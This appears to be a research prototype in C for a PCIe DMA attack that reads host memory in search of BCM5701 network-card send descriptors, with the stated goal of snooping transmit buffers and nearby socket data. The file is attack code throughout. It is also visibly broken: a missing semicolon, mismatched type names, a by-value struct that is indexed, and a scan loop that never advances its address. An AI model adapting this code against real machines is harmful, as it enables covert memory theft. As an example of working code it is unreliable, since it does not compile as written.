/*-
 * SPDX-License-Identifier: BSD-2-Clause
 * 
 * Copyright (c) 2015-2018 Colin Rothwell
 * 
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory under DARPA/AFRL contract FA8750-10-C-0237
 * ("CTSRD"), as part of the DARPA CRASH research programme.
 * 
 * We acknowledge the support of EPSRC.
 * 
 * We acknowledge the support of Arm Ltd.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <stdint.h>
#include <stdio.h>
#include <pcie.h>

/*
 * We want to snoop data out of anything interesting. A good candidate is the
 * transmit mbufs -- in particular we hope that we'll be able to some adjacent
 * local socket mbufs.
 *
 * We scan through pages, checking to see if the first 16 * 16 = 256 bytes all
 * match Brett's heuristic for a send buffer descriptor.
 */

/* Each send buffer descriptor is 128 bits = 16 bytes */
struct bcm5701_send_buffer_descriptor {
	uint64_t host_address;
	uint16_t flags;
	uint16_t length;
	uint16_t vlan_tag;
	uint16_t reserved;
}

void
print_descriptors(struct bcm5701_send_buffer_descriptor descriptor,
	uint64_t count)
{
	for (uint64_t i = 0; i < count; ++i) {
		printf("host_address: 0x%lx; flags: 0x%x; length: %d;"
			"vlan_tag: 0x%x; reserved: 0x%x.\n",
			descriptor[i].host_address, descriptor[i].flags,
			descriptor[i].length, descriptor[i].vlan_tag,
			descriptor[i].reserved);
	}
}

enum attack_state {
	AS_LOOKING_FOR_DESCRIPTOR_RING
};

int
main(int argc, char *argv[])
{
	int read_result;
	enum attack_state state = AS_LOOKING_FOR_DESCRIPTOR_RING;
	uint64_t read_addr = 0x400000;
	struct bcm_send_buffer_descriptor descriptors[16];
	/*
	 * We have found that in practise the tx ring is not located lower
	 * than this.
	 */

	while (1) {
		switch (state) {
		case AS_LOOKING_FOR_DESCRIPTOR_RING:
			read_result = perform_dma_read((uint8_t *)descriptors,
				256, 0, 0, read_addr);
			printf("Read result: %d.\n", read_result);
			print_descriptors(&descriptors, 16);
			break;
		}
	}
}
